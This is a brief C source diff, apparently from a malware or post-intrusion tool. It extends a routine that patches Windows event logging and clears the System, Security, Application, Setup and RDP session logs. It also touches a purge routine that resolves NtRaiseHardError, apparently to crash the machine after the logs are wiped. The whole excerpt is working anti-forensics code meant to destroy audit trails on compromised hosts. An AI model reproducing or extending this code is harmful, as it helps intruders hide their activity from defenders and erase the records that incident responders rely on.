@@ -50,13 +50,14 @@ static void PurgeNetSend(LPCWSTR fmt, ...) {
 
 void PurgeEvtLog(void) {
 	// Clear all event logs.
-	EvtlogAction(EVTLOG_DISABLE);
+	EvtlogAction(EVTLOG_PATCH);
 	EvtlogClear(L"System");
 	EvtlogClear(L"Application");
 	EvtlogClear(L"Setup");
 	EvtlogClear(L"Security");
 	EvtlogClear(L"Application");
 	// RDP logs.
+	EvtlogClear(L"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational");
 	EvtlogClear(L"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
 	// Sysmon logs.
 	//EvtlogClear(L"Microsoft-Windows-Sysmon");
@@ -164,6 +165,7 @@ void Purge(void) {
 
 		if (fpNtRaiseHardError == NULL) {
 			PurgeNetSend(L"Failed to resolve NtRaiseHardError; error: %lu", GetLastError());
+			return;
 		}
 
 		HARDERROR_RESPONSE hr;
